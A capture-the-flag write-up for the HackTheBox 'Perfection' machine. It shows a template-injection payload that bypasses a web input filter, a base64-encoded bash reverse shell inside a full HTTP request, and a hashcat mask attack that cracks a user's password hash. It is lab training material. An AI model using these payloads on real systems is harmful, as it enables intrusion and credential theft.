# HackTheBox - Perfection

## Enumeration

As always, we start with our nmap scan and find an SSH server and web server running.

```
# Nmap 7.94SVN scan initiated Fri Jul  5 09:25:03 2024 as: nmap -sCV -oN nmap/output 10.10.11.253
Nmap scan report for 10.10.11.253
Host is up (0.033s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  5 09:25:12 2024 -- 1 IP address (1 host up) scanned in 8.13 seconds
```

We begin exploring the web page which reveals us an interesting table.&#x20;

<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

There's various requirements for this and when we try to perform XSS or LFI there is some kind of filter that'll stop us from doing so. Scratching my head and hitting a brick wall we decide to get creative and we pass this into Burp. We begin experimenting with a new-line character and a similar XSS payload and find that this isn't working, curious as to where we go with this box we start getting creative and moving variables around. We take the "category1" variable and put it at the end of the request with this payload, and sure enough it works!

## User

We create a POC by pinging our own IP with the payload `a%0A<%25%3Dsystem("ping+-c1+10.10.14.147");%25>` and sure enough, get a response.

<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

This proves that the machine sent an ICMP request to our machine and that we have code execution. From this point it's just a case of placing a reverse shell in it's place and getting a shell on the box. We use a basic Bash shell and Base64 then URL encode it, to avoid any confusions in Burp.

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

Since we've base64 encoded it, we'll need to decode it before we run it, so our payload will look something like `a%0A<%25%3Dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNDcvNTAwMCAwPiYx+|+base64+-d+|+bash");%25>`

Meaning our full request looks like:

```
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 205
Origin: http://10.10.11.253
Connection: keep-alive
Referer: http://10.10.11.253/weighted-grade-calc
Upgrade-Insecure-Requests: 1

grade1=1&weight1=20&category2=1&grade2=1&weight2=20&category3=1&grade3=1&weight3=20&category4=1&grade4=1&weight4=20&category5=1&grade5=1&weight5=20&category1=a%0A<%25%3Dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNDcvNTAwMCAwPiYx+|+base64+-d+|+bash");%25>
```

With our listener setup, we send the request and sure enough, get a shell.

<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

## Root

As we're searching for things we find a database file in Susan's home directory and also a piece of mail aimed at Susan.

<figure><img src=".gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>



Now this is useful, this helps us know a format for possible passwords. We know that Susan's password must start "susan\_nasus\_XXXXXXXXXX". This seems like a job for Hashcat so we begin doing our research...

<figure><img src=".gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://hashcat.net/forum/thread-8032.html" %}

From the link shown here, we are pointed in the direction of a mask attack, so head to Hashcat's page on this and figure out what we're looking at.

{% embed url="https://hashcat.net/wiki/doku.php?id=mask_attack" %}

So theoretically if we had Susan's hash, we could execute a command that tried to solve the random number and we should hopefully get our password.

<figure><img src=".gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

We head back to the database file and things don't quite look right, so decide to look at the strings of the file which reveals a slightly better layout of it.

<figure><img src=".gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

We did our recon on the page and found that Susan's full name is Susan Miller so can assume the hash starts after that which gives us `abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`.



We're unsure on the hash type so decide to run this command twice, the first to identifty the hash type that Hashcat thinks is most likely, and then with that hash type.&#x20;

<figure><img src=".gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

And then we run the command again with mode 1400 - `` hashcat hash -m 1400 -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d` ``

Leaving this to run for a couple of minutes eventually gives us the correct password which, when we pass to our shell shows we have full sudo privileges!

<figure><img src=".gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

Nice and simple, we spawn ourselves a root shell and that's the box!

<figure><img src=".gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
